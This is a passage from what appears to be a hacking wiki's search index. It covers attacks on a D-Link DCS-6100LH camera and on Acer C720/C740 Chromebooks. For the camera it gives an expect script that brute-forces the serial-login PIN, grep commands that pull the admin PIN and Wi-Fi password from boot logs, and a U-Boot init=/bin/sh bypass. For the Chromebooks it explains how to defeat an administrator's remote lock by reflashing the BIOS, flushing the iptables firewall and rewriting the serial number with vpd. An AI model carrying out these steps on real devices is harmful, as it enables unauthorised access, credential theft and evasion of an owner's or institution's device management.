thereforce its the perfect way to go for see what is going on another window, however it's an awesome way to read serial stdin without using more advanced languages for this kind of tasks, below is an example how we can could use expect for a bruteforce script: set baud 115200 if { $argc >= 1 } { set tty [ lindex $argv 0 ] } if { $argc >= 2 } { set baud [ lindex $argv 1 ] } spawn screen / dev / ttyACM0 $baud send \\ r expect { \"DCS-6100LH login: \" { send admin \\ r expect \"Password: \" send $pin-codes \\ r } \"#\" } interact ..since we know the pin-code is a length of six numbers we could generate numbers from 00000-999999 in a simple bash for loop, however since the device in serial replies within milliseconds (this is often set on the other side but not on this dlink camera it seems, it has no time limit set for failed passwords) I would hack this pin-code within few minutes, ~10minutes max with my slow CPU ( Intel(R) Core(TM) i7-5600U CPU @ 2.60GHz ) My CPU generates 000000 to 999999 in 26 seconds, we want to stay on the safe side when we bruteForcing so a timeout is needed for not miss any true value when pincode is found, a timeout every 500ms for every failed login by using 'set timeout X' in the code snippet above would be perfect for not fuck up the exit code so we know when the value is true and the pin code is found, however see below and copy and paste and if you have some basic knowledge about tcl and shell, you have everything you need to getting started: for pin-codes in $( seq -w 000000 99999 ) ; do ....tcl code above .......**set timeout -1** done TCL pwnz when we using serial communications for 'expect(ing)' and automate stuff via serial communication, whatever. Lets move further and see how we grab everything in plain-text without using some hacking scripts.","title":"STdin/STdout"},{"location":"hacking/cameras/dlink-6100lh/#grep-wifi-password","text":"We can read the dc_6200lh.txt in realtime, and also we can grep what we want - Nice ! tail -f dc_6200lh.txt | egrep -i \"Wifi_ap_pwd\"","title":"Grep WiFi Password"},{"location":"hacking/cameras/dlink-6100lh/#and-ohyeah-here-we-go-pin-code-found","text":"tail -f dc_6200lh.txt | egrep -o 'user=admin,pass=......' Catching, done . No hacks needed and no brute-force needed.","title":"And, ohyeah here we go, pin-code found:"},{"location":"hacking/cameras/dlink-6100lh/#see-full-boot-process","text":"Right click on the video and press open image on a new tab for get 1080p resolution for readable text.","title":"See Full Boot Process"},{"location":"hacking/cameras/dlink-6100lh/#ipports","text":"There is nothing more to add about this device that is interesting that you cant figure out yourself, btw, default ip and opened ports: IP...: 192.168.0.20 Ports: 554,8080,7000,6000","title":"IP/Ports"},{"location":"hacking/cameras/dlink-6100lh/#u-boot","text":"U-Boot 2016 .11 ( Jul 01 2020 - 17 :46:25 +0800 ) mips-linux-uclibc-xgcc ( Realtek RSDK-6.4.1 Build 3029 ) 6 .4.1 20180425 GNU ld ( Realtek RSDK-6.4.1 Build 3029 ) 2 .27.90.20161222 = > help ? - alias for 'help' base - print or set address offset bdinfo - print Board Info structure boot- boot default, i.e., run 'bootcmd' bootd - boot default, i.e., run 'bootcmd' bootelf - Boot from an ELF image in memory bootm - boot application image from memory bootvx - Boot vxWorks from an ELF image cmp - memory compare coninfo - print console devices and information cp - memory copy crc32 - checksum calculation dma - dma copy editenv - edit environment variable env - environment handling commands fatinfo - print information about filesystem fatload - load binary file from a dos filesystem fatls - list files in a directory ( default / ) fatsize - determine a file 's size fephy - fephy read/write go - start application at address ' addr ' help - print command description/usage iminfo - print header information for application image imls- list all images found in flash imxtract- extract a part of a multi-image md - memory display mm - memory modify ( auto-incrementing address ) mmc - MMC sub system mmcinfo - display MMC info mw - memory write ( fill ) nfs - boot image via network using NFS protocol nm - memory modify ( constant address ) ping - send ICMP ECHO_REQUEST to network host printenv - print environment variables reset - Perform RESET of the CPU run - run commands in an environment variable saveenv - save environment variables to flash setenv - set environment variables setethaddr - set eth address setipaddr - set ip address sf - SPI flash sub-system sleep - delay execution for some time tftpboot - boot image via network using TFTP protocol tftpput - TFTP put command, for uploading files to a server tftpsrv - act as a TFTP server and boot the first received file update - update xxx version - print monitor, compiler and linker version = > printenv baudrate = 57600 bootaddr = 0xBC000000 + 0x50000 bootargs = console = ttyS1,115200 root = /dev/mtdblock3 rts-quadspi.channels = dual mtdparts = 18030000 .spic:16384k@0 ( global ) ,320k@0k ( boot ) ,2304k@320k ( kernel ) ,3584k@2624k ( rootfs ) ,7744k@6208k ( userdata ) ,2048k@13952k ( userdata2 ) ,384k@16000k ( userdata3 ) bootcmd = bootm 0xbc050000 bootdelay = 2 ethact = r8168#0 oadaddr = 0x80010000 netretry = yes stderr = serial stdin = serial stdout = serial Access UBOOT by hit any key before 5 seconds when it boots, and from u-boot menu you should read on some wiki how to use the commands but printenv or 'pr' will print the interesting things, to edit bootargs for example you just tneet to type: setenv bootargs console = ttyS0,115200............... Bypass login by add the below line to bootargs but it is really not needed since password is the pin-code we can grab as on the video provided above and yeah so are the default username wich is: admin: setenv bootargs $( BOOTARGS ) init = /bin/sh boot I do not recommending anyone to change bootargs cause its useless as said. If you get stuck in boot after you played with bootargs and get a kernel panic for some reason - DON'T PANIC ;) - Restart the device and enter CFE boot and reset default by: env default -a saveenv reset","title":"U-Boot:"},{"location":"hacking/cameras/dlink-6100lh/#sources","text":"Device Info","title":"Sources"},{"location":"hacking/cameras/dlink-6100lh/#authors","text":"wuseman < wuseman@nr1.nu >","title":"Authors"},{"location":"hacking/cameras/dlink-6100lh/#license","text":"This project is licensed under the GNU General Public License v3.0 - see the LICENSE.md file for details","title":"License"},{"location":"hacking/cameras/dlink-6100lh/#contact","text":"If you have problems, questions, ideas or suggestions please contact me on * wuseman@nr1.nu - For faster contact visit Libera irc network or the webchat and type '/msg wuseman hi!' in the input bar and I will reply to you ASAP. Enter Libera's network via your own client 'chat.libera.chat:+6697 or use their new web client here . Happy Hacking!","title":"Contact"},{"location":"hacking/chromebook/","text":"chromebook chromebook related stuff will be found here","title":"chromebook"},{"location":"hacking/chromebook/#chromebook","text":"chromebook related stuff will be found here","title":"chromebook"},{"location":"hacking/chromebook/acer_chromebook_c720/","text":"Acer C720 How to hack any Acer C7(4)20 Chromebook that has been locked remotely by admin and how easy it is to take control over a chromebook Whole process from the first time we start this device until device will enter enrollment and there is nothing we can do more then see the process happening and then its out of our control (if we are not the admin) So, are we pwned? Of course not nothing is impossible!! Now let us hack this device First of all, you must unscrew all screws and then when you opened the bottom of the laptop you must now remove the write-protection screw. Also, remove the battery: Now, with your bios/eeprom programmer you can read and overwrite the current bios. The b\u00edos chip is the below one: Once clip is conncted and your programmer found the clip, backup the current data on the chip: flashrom -p ch341a_spi -r acer_c720p-locked.bin Write a clean bios to the chip: flashrom -p ch341a_spi -w new_bios.bin Kernel commandline: cros_secure console= loglevel=7 init=/sbin/init cros_secure root=PARTUUID=7154669e-fca8-7e42-a967-fb4d9fa17343/PARTNROFF=1 rootwait rw dm_verity.error_behavior=3 dm_verity.max_bios=-1 dm_verity.dev_wait=0 dm=\"1 vroot none ro 1,0 2539520 verity payload=ROOT_DEV hashtree=HASH_DEV hashstart=2539520 alg=sha1 root_hexdigest=9c99ef74f8143304bad67f5ca941b0c0ccda3b0f salt=e5c44164a1e83b080c2d60e769953ba0a6138c654da4e929a1500825363be829\" noinitrd vt.global_cursor_default=0 kern_guid=7154669e-fca8-7e42-a967-fb4d9fa17343 add_efi_memmap boot=local noresume noswap i915.modeset=1 tpm_tis.force=1 tpm_tis.interrupts=0 nmi_watchdog=panic,lapic iTCO_vendor_support.vendorsupport=3 Modules Default modules for C720 Module Size Used by cmac 12903 2 rfcomm 28294 4 i2c_dev 13075 0 uinput 17359 0 memconsole 12517 0 ath3k 16819 0 snd_hda_codec_realtek 36389 1 btusb 38875 0 btrtl 12493 1 btusb btbcm 12876 1 btusb btintel 13157 1 btusb bluetooth 316837 33 ath3k,btbcm,btrtl,btusb,rfcomm,btintel zram 17580 1 zsmalloc 13082 1 zram snd_hda_codec_hdmi 35766 1 uvcvideo 70677 0 videobuf2_vmalloc 12897 1 uvcvideo videobuf2_memops 12617 1 videobuf2_vmalloc videobuf2_core 31555 1 uvcvideo snd_hda_intel 39591 5 snd_hda_codec 138464 3 snd_hda_codec_realtek,snd_hda_codec_hdmi,snd_hda_intel snd_hwdep 13442 1 snd_hda_codec snd_pcm 76877 3 snd_hda_codec_hdmi,snd_hda_codec,snd_hda_intel snd_page_alloc 17260 2 snd_pcm,snd_hda_intel fuse 70564 2 nf_conntrack_ipv6 13689 2 nf_defrag_ipv6 12884 1 nf_conntrack_ipv6 ip6table_filter 12540 1 ip6_tables 21995 1 ip6table_filter snd_seq_midi 12848 0 snd_seq_midi_event 13511 1 snd_seq_midi snd_rawmidi 22993 1 snd_seq_midi snd_seq 53235 2 snd_seq_midi_event,snd_seq_midi snd_seq_device 13234 3 snd_seq,snd_rawmidi,snd_seq_midi snd_timer 27201 2 snd_pcm,snd_seq ath9k_btcoex 120187 0 ath9k_common_btcoex 12819 1 ath9k_btcoex ath9k_hw_btcoex 375415 2 ath9k_btcoex,ath9k_common_btcoex ath 22041 3 ath9k_btcoex,ath9k_hw_btcoex,ath9k_common_btcoex mac80211 377318 1 ath9k_btcoex cfg80211 159864 3 ath,ath9k_btcoex,mac80211 joydev 17112 0 lspci 00 :00.0 Host bridge: Intel Corporation Haswell-ULT DRAM Controller ( rev 0b ) 00 :02.0 VGA compatible controller: Intel Corporation Haswell-ULT Integrated Graphics Controller ( rev 0b ) 00 :03.0 Audio device: Intel Corporation Haswell-ULT HD Audio Controller ( rev 0b ) 00 :14.0 USB controller: Intel Corporation 8 Series USB xHCI HC ( rev 04 ) 00 :15.0 DMA controller: Intel Corporation 8 Series Low Power Sub-System DMA ( rev 04 ) 00 :15.1 Serial bus controller [ 0c80 ] : Intel Corporation 8 Series I2C Controller #0 (rev 04) 00 :15.2 Serial bus controller [ 0c80 ] : Intel Corporation 8 Series I2C Controller #1 (rev 04) 00 :1b.0 Audio device: Intel Corporation 8 Series HD Audio Controller ( rev 04 ) 00 :1c.0 PCI bridge: Intel Corporation 8 Series PCI Express Root Port 1 ( rev e4 ) 00 :1f.0 ISA bridge: Intel Corporation 8 Series LPC Controller ( rev 04 ) 00 :1f.2 SATA controller: Intel Corporation 8 Series SATA Controller 1 [ AHCI mode ] ( rev 04 ) 00 :1f.3 SMBus: Intel Corporation 8 Series SMBus Controller ( rev 04 ) 00 :1f.6 Signal processing controller: Intel Corporation 8 Series Thermal ( rev 04 ) 01 :00.0 Network controller: Qualcomm Atheros AR9462 Wireless Network Adapter ( rev 01 ) SSHD sshd is already installed and running but you wont be able to ssh into the device from another device because iptables is active and is set to DROP everything as default: Chain INPUT ( policy DROP ) target prot opt source destination ACCEPT all -- anywhere anywhere state RELATED,ESTABLISHED ACCEPT all -- anywhere anywhere ACCEPT icmp -- anywhere anywhere ACCEPT udp -- anywhere 224 .0.0.251 udp dpt:mdns ACCEPT udp -- anywhere 239 .255.255.250 udp dpt:1900 NFQUEUE udp -- anywhere anywhere NFQUEUE num 10000 ACCEPT tcp -- anywhere anywhere tcp dpt:ssh Chain FORWARD ( policy DROP ) target prot opt source destination Chain OUTPUT ( policy DROP ) target prot opt source destination NFQUEUE udp -- anywhere 224 .0.0.251 udp dpt:mdns NFQUEUE num 10001 NFQUEUE udp -- anywhere 239 .255.255.250 udp dpt:1900 NFQUEUE num 10001 ACCEPT all -- anywhere anywhere state NEW,RELATED,ESTABLISHED ACCEPT all -- anywhere anywhere Just allow port 22 or clear iptables: iPV4 = \" $( grep . /proc/net/fib_trie ) \" iPV6 = \" $( grep '.' /proc/net/if_inet6 ) \" ; if [[ -n \" ${ iPV4 } \" ]] ; then printf \"%25s\\n\" | tr ' ' '-' printf \"%s\\n\" \"Removing all ipv4 rules\" iptables -P INPUT ACCEPT iptables -P FORWARD ACCEPT iptables -P OUTPUT ACCEPT iptables -t nat -F & > /dev/null iptables -t mangle -F & > /dev/null iptables -F iptables -X printf \"%s\\n\" \"...Done\" fi if [[ -n \" ${ iPV6 } \" ]] ; then printf \"%25s\\n\" | tr ' ' '-' printf \"%s\\n\" \"Removing all ipv6 rules\" ip6tables -P INPUT ACCEPT ip6tables -P FORWARD ACCEPT ip6tables -P OUTPUT ACCEPT ip6tables -t nat -F & > /dev/null ip6tables -t mangle -F & > /dev/null ip6tables -F ip6tables -X printf \"%s\\n\" \"...Done\" fi printf \"%25s\\n\" | tr ' ' '-' Try ssh again, root works fine. NOTICE: You must set a root password before you can ssh into the device Set chromeos devpassword: PASSWD_FILE = '/mnt/stateful_partition/etc/devmode.passwd' pass = $( openssl passwd -1 ) mkdir -p \" ${ PASSWD_FILE %/* } \" chmod 600 \" ${ PASSWD_FILE } \" echo \"chronos: ${ pass } \" > \" ${ PASSWD_FILE } VPD: This is funny. The remote lock is locking devices via the serial number and as root we can list the currect info about device via vpd -l and we are also allowed to write new serial number without any hacking needed, the screw must be removed (see the top of post, WP-Screw) vpd -i RO_VPD -s serial_number=xxxxxxx hit enter verify that our new serial has been written: vpd -l Read more about VPD and how it works on url: https://chromium.googlesource.com/chromiumos/platform/vpd/ Touche! :)","title":"acer c720"},{"location":"hacking/chromebook/acer_chromebook_c720/#acer-c720","text":"How to hack any Acer C7(4)20 Chromebook that has been locked remotely by admin and how easy it is to take control over a chromebook Whole process from the first time we start this device until device will enter enrollment and there is nothing we can do more then see the process happening and then its out of our control (if we are not the admin) So, are we pwned? Of course not nothing is impossible!! Now let us hack this device First of all, you must unscrew all screws and then when you opened the bottom of the laptop you must now remove the write-protection screw. Also, remove the battery: Now, with your bios/eeprom programmer you can read and overwrite the current bios. The b\u00edos chip is the below one: Once clip is conncted and your programmer found the clip, backup the current data on the chip: flashrom -p ch341a_spi -r acer_c720p-locked.bin","title":"Acer C720"},{"location":"hacking/chromebook/acer_chromebook_c720/#write-a-clean-bios-to-the-chip","text":"flashrom -p ch341a_spi -w new_bios.bin","title":"Write a clean bios to the chip:"},{"location":"hacking/chromebook/acer_chromebook_c720/#kernel-commandline","text":"cros_secure console= loglevel=7 init=/sbin/init cros_secure root=PARTUUID=7154669e-fca8-7e42-a967-fb4d9fa17343/PARTNROFF=1 rootwait rw dm_verity.error_behavior=3 dm_verity.max_bios=-1 dm_verity.dev_wait=0 dm=\"1 vroot none ro 1,0 2539520 verity payload=ROOT_DEV hashtree=HASH_DEV hashstart=2539520 alg=sha1 root_hexdigest=9c99ef74f8143304bad67f5ca941b0c0ccda3b0f salt=e5c44164a1e83b080c2d60e769953ba0a6138c654da4e929a1500825363be829\" noinitrd vt.global_cursor_default=0 kern_guid=7154669e-fca8-7e42-a967-fb4d9fa17343 add_efi_memmap boot=local noresume noswap i915.modeset=1 tpm_tis.force=1 tpm_tis.interrupts=0 nmi_watchdog=panic,lapic iTCO_vendor_support.vendorsupport=3","title":"Kernel commandline:"},{"location":"hacking/chromebook/acer_chromebook_c720/#modules","text":"Default modules for C720 Module Size Used by cmac 12903 2 rfcomm 28294 4 i2c_dev 13075 0 uinput 17359 0 memconsole 12517 0 ath3k 16819 0 snd_hda_codec_realtek 36389 1 btusb 38875 0 btrtl 12493 1 btusb btbcm 12876 1 btusb btintel 13157 1 btusb bluetooth 316837 33 ath3k,btbcm,btrtl,btusb,rfcomm,btintel zram 17580 1 zsmalloc 13082 1 zram snd_hda_codec_hdmi 35766 1 uvcvideo 70677 0 videobuf2_vmalloc 12897 1 uvcvideo videobuf2_memops 12617 1 videobuf2_vmalloc videobuf2_core 31555 1 uvcvideo snd_hda_intel 39591 5 snd_hda_codec 138464 3 snd_hda_codec_realtek,snd_hda_codec_hdmi,snd_hda_intel snd_hwdep 13442 1 snd_hda_codec snd_pcm 76877 3 snd_hda_codec_hdmi,snd_hda_codec,snd_hda_intel snd_page_alloc 17260 2 snd_pcm,snd_hda_intel fuse 70564 2 nf_conntrack_ipv6 13689 2 nf_defrag_ipv6 12884 1 nf_conntrack_ipv6 ip6table_filter 12540 1 ip6_tables 21995 1 ip6table_filter snd_seq_midi 12848 0 snd_seq_midi_event 13511 1 snd_seq_midi snd_rawmidi 22993 1 snd_seq_midi snd_seq 53235 2 snd_seq_midi_event,snd_seq_midi snd_seq_device 13234 3 snd_seq,snd_rawmidi,snd_seq_midi snd_timer 27201 2 snd_pcm,snd_seq ath9k_btcoex 120187 0 ath9k_common_btcoex 12819 1 ath9k_btcoex ath9k_hw_btcoex 375415 2 ath9k_btcoex,ath9k_common_btcoex ath 22041 3 ath9k_btcoex,ath9k_hw_btcoex,ath9k_common_btcoex mac80211 377318 1 ath9k_btcoex cfg80211 159864 3 ath,ath9k_btcoex,mac80211 joydev 17112 0","title":"Modules"},{"location":"hacking/chromebook/acer_chromebook_c720/#lspci","text":"00 :00.0 Host bridge: Intel Corporation Haswell-ULT DRAM Controller ( rev 0b ) 00 :02.0 VGA compatible controller: Intel Corporation Haswell-ULT Integrated Graphics Controller ( rev 0b ) 00 :03.0 Audio device: Intel Corporation Haswell-ULT HD Audio Controller ( rev 0b ) 00 :14.0 USB controller: Intel Corporation 8 Series USB xHCI HC ( rev 04 ) 00 :15.0 DMA controller: Intel Corporation 8 Series Low Power Sub-System DMA ( rev 04 ) 00 :15.1 Serial bus controller [ 0c80 ] : Intel Corporation 8 Series I2C Controller #0 (rev 04) 00 :15.2 Serial bus controller [ 0c80 ] : Intel Corporation 8 Series I2C Controller #1 (rev 04) 00 :1b.0 Audio device: Intel Corporation 8 Series HD Audio Controller ( rev 04 ) 00 :1c.0 PCI bridge: Intel Corporation 8 Series PCI Express Root Port 1 ( rev e4 ) 00 :1f.0 ISA bridge: Intel Corporation 8 Series LPC Controller ( rev 04 ) 00 :1f.2 SATA controller: Intel Corporation 8 Series SATA Controller 1 [ AHCI mode ] ( rev 04 ) 00 :1f.3 SMBus: Intel Corporation 8 Series SMBus Controller ( rev 04 ) 00 :1f.6 Signal processing controller: Intel Corporation 8 Series Thermal ( rev 04 ) 01 :00.0 Network controller: Qualcomm Atheros AR9462 Wireless Network Adapter ( rev 01 )","title":"lspci"},{"location":"hacking/chromebook/acer_chromebook_c720/#sshd","text":"sshd is already installed and running but you wont be able to ssh into the device from another device because iptables is active and is set to DROP everything as default: Chain INPUT ( policy DROP ) target prot opt source destination ACCEPT all -- anywhere anywhere state RELATED,ESTABLISHED ACCEPT all -- anywhere anywhere ACCEPT icmp -- anywhere anywhere ACCEPT udp -- anywhere 224 .0.0.251 udp dpt:mdns ACCEPT udp -- anywhere 239 .255.255.250 udp dpt:1900 NFQUEUE udp -- anywhere anywhere NFQUEUE num 10000 ACCEPT tcp -- anywhere anywhere tcp dpt:ssh Chain FORWARD ( policy DROP ) target prot opt source destination Chain OUTPUT ( policy DROP ) target prot opt source destination NFQUEUE udp -- anywhere 224 .0.0.251 udp dpt:mdns NFQUEUE num 10001 NFQUEUE udp -- anywhere 239 .255.255.250 udp dpt:1900 NFQUEUE num 10001 ACCEPT all -- anywhere anywhere state NEW,RELATED,ESTABLISHED ACCEPT all -- anywhere anywhere Just allow port 22 or clear iptables: iPV4 = \" $( grep . /proc/net/fib_trie ) \" iPV6 = \" $( grep '.' /proc/net/if_inet6 ) \" ; if [[ -n \" ${ iPV4 } \" ]] ; then printf \"%25s\\n\" | tr ' ' '-' printf \"%s\\n\" \"Removing all ipv4 rules\" iptables -P INPUT ACCEPT iptables -P FORWARD ACCEPT iptables -P OUTPUT ACCEPT iptables -t nat -F & > /dev/null iptables -t mangle -F & > /dev/null iptables -F iptables -X printf \"%s\\n\" \"...Done\" fi if [[ -n \" ${ iPV6 } \" ]] ; then printf \"%25s\\n\" | tr ' ' '-' printf \"%s\\n\" \"Removing all ipv6 rules\" ip6tables -P INPUT ACCEPT ip6tables -P FORWARD ACCEPT ip6tables -P OUTPUT ACCEPT ip6tables -t nat -F & > /dev/null ip6tables -t mangle -F & > /dev/null ip6tables -F ip6tables -X printf \"%s\\n\" \"...Done\" fi printf \"%25s\\n\" | tr ' ' '-' Try ssh again, root works fine. NOTICE: You must set a root password before you can ssh into the device","title":"SSHD"},{"location":"hacking/chromebook/acer_chromebook_c720/#set-chromeos-devpassword","text":"PASSWD_FILE = '/mnt/stateful_partition/etc/devmode.passwd' pass = $( openssl passwd -1 ) mkdir -p \" ${ PASSWD_FILE %/* } \" chmod 600 \" ${ PASSWD_FILE } \" echo \"chronos: ${ pass } \" > \" ${ PASSWD_FILE }","title":"Set chromeos devpassword:"},{"location":"hacking/chromebook/acer_chromebook_c720/#vpd","text":"This is funny. The remote lock is locking devices via the serial number and as root we can list the currect info about device via vpd -l and we are also allowed to write new serial number without any hacking needed, the screw must be removed (see the top of post, WP-Screw) vpd -i RO_VPD -s serial_number=xxxxxxx hit enter verify that our new serial has been written: vpd -l Read more about VPD and how it works on url: https://chromium.googlesource.com/chromiumos/platform/vpd/ Touche! :)","title":"VPD:"},{"location":"hacking/chromebook/acer_chromebook_c740/","text":"Acer (Chromebook) - C740 This repo is far from done, it can be updated any time. This repository is created for To share with me knowledge and everything is done for educational purposes. I take no responsibility whatsoever over other users' responsibility and I urge no one to use these methods to bypass and remotely lock the chromebook. All pictures is from my Google Pixel 4 device, got few q about that \ud83e\udd16 Unbrick a bad flash Bypass a remote locked Chromebook (Acer C740) wich will be my device for show and give you examples, it works same for all laptops no matter what sytem you run. I always want to find out what's going on on the other side and not only know how to get things done but because I love learning new things and then I need to know how it goes when locking a chromebook as an administrator, so if if you want to learn more, you can create a Google Admin account that costs some money, but it's worth it, so you do not have to speculate about what your chef / teacher can see, but I will not address that here and now. until later. A chromebook that is first via the remote control and leaves a message on the screen that the device should te.x return to X and on the phone number X so the serial number must be changed, this is how they lock the device and it is possible to get past by flashing bios with a new rom. For this you need three things. Bios Programmer (I use ch341a myself) One 8 soic clip (recommended: don't buy a cheap one, they will last 1-3 times then you wont be able to attach the clipper again and it is annoying something extreme so go for a 3M one) A new rom (this can be found on variou places online) Either you can buy a fixed clip or you can connect cables as I do in the banner. A pre-fixed clip + contact (price for this is usually ~1\u20ac->3\u20ac, you can get over them cheaper but in avg this is the price) A custom made clip if you are really poor you can get a clip from ~0.1$ How should i place pins? CH341 as a programmer OR a reader From store, you will get a jumper for pins, hence my own jump on the picture but when 1&2 are bracked the device is conifgured as a programmer: If you remove the jumper the ch341 is a serial console reader, as a TTL Serial Converter (ftdi rs232, for example) adapter: The dot i marked is were the VOLTAGE should be, this is really really important otherwise your ship may burn: Flashing First we need flashrom, install as below: Gentoo: emerge --ask flashrom Ubuntu/Debian/Kali/Mint: apt-get install flashrom MrChromebox: wget https://mrchromebox.tech/files/util/flashrom_20200918.tar.gz && tar -zxf flashrom_20200918.tar.gz Test connectivity and ensure the flash chip is properly identified: flashrom -p ch341a_spi Extract old BIOS: flashrom -p ch341a_spi -r old_bios.rom Write new BIOS: It's really important to wait until whole process is done, it will also VERIFY the new bios flashrom -p ch341a_spi -w new_bios.rom Thats it :) ChromeOS Hacking Change serial/service number/tag vpd -i RO_VPD -s serial_number=xxxxxxx\" (xxxxxxx is the Service Tag of the system Verify that things has been written: vpd -l Misc: We are not allowed to browse mrchromebox archive site but after some digging I found 'cbmodels.json' and from here we can get all files (sorry if you don't like this), so with below command you can download all roms from mrchromebox wiki (they all are stored under roms) curl -sL https://nr1.nu/archive/chromebook/misc/cbmodels.json|grep -Eo '(http|https)://[^/\"].*rom'| xargs wget -q --show-progress Also available from: https://github.com/wuseman/Acer_Chromebook-C740/tree/main/roms Firmware Sources for Google ChromeOS https://cros.tech/ https://cros.tech/table https://cros-updates-serving.appspot.com/ GREP latest firmwares for your chromebook model (grunt in this example): elinks -dump https://cros-updates-serving.appspot.com/|grep -i grun |cut -d' ' -f3|xargs wget -q --show-progress Very good explanation from Raymond Genovese how to reset the pins so I decided to include this in this repo: https://forum.allaboutcircuits.com/threads/resetting-a-bios-chip-very-manually.153848/#post-1322752 \"Resetting that chip is very simple. Find the reset pin. It is active low. Connect that pin to ground for at least a us. Of course the chip has to be powered and you have to make sure that you are not applying a ground signal to the pin if it is being held high, unless the circuitry can support that. A reset returns the chip to the power on state. A reset does not erase the flash memory. On the 8-pin package it is a little more complicated and it depends on some other factors. In fact, the pin that you would use to perform the reset can be programed as an I/O pin and not a reset pin. I know your question specifically asks if you should do that with or without power and I am intentionally avoiding answering that at this point except to say that if no power is on anywhere, you will not be resetting the chip. My guess is that you do not really want to reset the chip; you want to reset a portion of your BIOS that is stored on the chip and you hope that you can do that by simply resetting the chip. It is possible that when the system boots up, it looks at that pin/line (which again can be configured as I/O) and if it reads as GND while it is booting up (i.e., it would normally be high); it interrupts the normal boot and executes special code that re-writes dedicated areas of memory that hold configuration data (exactly the kind of data that can appear to brick the machine if it gets corrupted). That could, therefore, be a way that a technician might be able to restore the factory defaults if the code exists to do so. That is possible, but you would need to make certain it is the case and not just hope it is because it is also possible to do additional damage, especially if you very little experience with such matters. In my opinion, it is not possible to clear the BIOS by resetting the chip alone. I had an unpleasant experience attempting to help someone who was following such a train of thought (with a different computer) and it was a one way trip. I regret that I ever had attempted to help him at all. But that was my choice and I am willing to help you if I can, as are many others on here. So, to cut to the chase, how did the computer get trashed and what is it doing or not doing? Why did you decide that you needed to perform the reset to reinstall the factory BIOS settings? Have you already tried any of the many fixes on YouTube and the like?\" Requirements A chromebook device, soic 8 clip and a ch341 eeprom/bios reader Contact If you have problems, questions, ideas or suggestions please contact me by posting to wuseman@nr1.nu Web Visit my websites and profiles for the latest info and updated tools @wuseman && https://nr1.nu && https://stackoverflow.com/users/9887151/wuseman","title":"acer c740"},{"location":"hacking/chromebook/acer_chromebook_c740/#acer-chromebook---c740","text":"This repo is far from done, it can be updated any time. This repository is created for To share with me knowledge and everything is done for educational purposes. I take no responsibility whatsoever over other users' responsibility and I urge no one to use these methods to bypass and remotely lock the chromebook. All pictures is from my Google Pixel 4 device, got few q about that \ud83e\udd16","title":"Acer (Chromebook) - C740"},{"location":"hacking/chromebook/acer_chromebook_c740/#unbrick-a-bad-flash","text":"Bypass a remote locked Chromebook (Acer C740) wich will be my device for show and give you examples, it works same for all laptops no matter what sytem you run. I always want to find out what's going on on the other side and not only know how to get things done but because I love learning new things and then I need to know how it goes when locking a chromebook as an administrator, so if if you want to learn more, you can create a Google Admin account that costs some money, but it's worth it, so you do not have to speculate about what your chef / teacher can see, but I will not address that here and now. until later. A chromebook that is first via the remote control and leaves a message on the screen that the device should te.x return to X and on the phone number X so the serial number must be changed, this is how they lock the device and it is possible to get past by flashing bios with a new rom. For this you need three things. Bios Programmer (I use ch341a myself) One 8 soic clip (recommended: don't buy a cheap one, they will last 1-3 times then you wont be able to attach the clipper again and it is annoying something extreme so go for a 3M one) A new rom (this can be found on variou places online) Either you can buy a fixed clip or you can connect cables as I do in the banner.","title":"Unbrick a bad flash"},{"location":"hacking/chromebook/acer_chromebook_c740/#a-pre-fixed-clip--contact-price-for-this-is-usually-1-3-you-can-get-over-them-cheaper-but-in-avg-this-is-the-price","text":"","title":"A pre-fixed clip + contact (price for this is usually ~1\u20ac-&gt;3\u20ac, you can get over them cheaper but in avg this is the price)"},{"location":"hacking/chromebook/acer_chromebook_c740/#a-custom-made-clip-if-you-are-really-poor-you-can-get-a-clip-from-01","text":"","title":"A custom made clip if you are really poor you can get a clip from ~0.1$"},{"location":"hacking/chromebook/acer_chromebook_c740/#how-should-i-place-pins","text":"","title":"How should i place pins?"},{"location":"hacking/chromebook/acer_chromebook_c740/#ch341-as-a-programmer-or-a-reader","text":"From store, you will get a jumper for pins, hence my own jump on the picture but when 1&2 are bracked the device is conifgured as a programmer: If you remove the jumper the ch341 is a serial console reader, as a TTL Serial Converter (ftdi rs232, for example) adapter: The dot i marked is were the VOLTAGE should be, this is really really important otherwise your ship may burn:","title":"CH341 as a programmer OR a reader"},{"location":"hacking/chromebook/acer_chromebook_c740/#flashing","text":"","title":"Flashing"},{"location":"hacking/chromebook/acer_chromebook_c740/#first-we-need-flashrom-install-as-below","text":"Gentoo: emerge --ask flashrom Ubuntu/Debian/Kali/Mint: apt-get install flashrom MrChromebox: wget https://mrchromebox.tech/files/util/flashrom_20200918.tar.gz && tar -zxf flashrom_20200918.tar.gz","title":"First we need flashrom, install as below:"},{"location":"hacking/chromebook/acer_chromebook_c740/#test-connectivity-and-ensure-the-flash-chip-is-properly-identified","text":"flashrom -p ch341a_spi","title":"Test connectivity and ensure the flash chip is properly identified:"},{"location":"hacking/chromebook/acer_chromebook_c740/#extract-old-bios","text":"flashrom -p ch341a_spi -r old_bios.rom","title":"Extract old BIOS:"},{"location":"hacking/chromebook/acer_chromebook_c740/#write-new-bios","text":"It's really important to wait until whole process is done, it will also VERIFY the new bios flashrom -p ch341a_spi -w new_bios.rom","title":"Write new BIOS:"},{"location":"hacking/chromebook/acer_chromebook_c740/#thats-it-","text":"","title":"Thats it :)"},{"location":"hacking/chromebook/acer_chromebook_c740/#chromeos-hacking","text":"","title":"ChromeOS Hacking"},{"location":"hacking/chromebook/acer_chromebook_c740/#change-serialservice-numbertag","text":"vpd -i RO_VPD -s serial_number=xxxxxxx\" (xxxxxxx is the Service Tag of the system","title":"Change serial/service number/tag"},{"location":"hacking/chromebook/acer_chromebook_c740/#verify-that-things-has-been-written","text":"vpd -l","title":"Verify that things has been written:"},{"location":"hacking/chromebook/acer_chromebook_c740/#misc","text":"We are not allowed to browse mrchromebox archive site but after some digging I found 'cbmodels.json' and from here we can get all files (sorry if you don't like this), so with below command you can download all roms from mrchromebox wiki (they all are stored under roms) curl -sL https://nr1.nu/archive/chromebook/misc/cbmodels.json|grep -Eo '(http|https)://[^/\"].*rom'| xargs wget -q --show-progress Also available from: https://github.com/wuseman/Acer_Chromebook-C740/tree/main/roms","title":"Misc:"},{"location":"hacking/chromebook/acer_chromebook_c740/#firmware-sources-for-google-chromeos","text":"https://cros.tech/ https://cros.tech/table https://cros-updates-serving.appspot.com/","title":"Firmware Sources for Google ChromeOS"},{"location":"hacking/chromebook/acer_chromebook_c740/#grep-latest-firmwares-for-your-chromebook-model-grunt-in-this-example","text":"elinks -dump https://cros-updates-serving.appspot.com/|grep -i grun |cut -d' ' -f3|xargs wget -q --show-progress","title":"GREP latest firmwares for your chromebook model 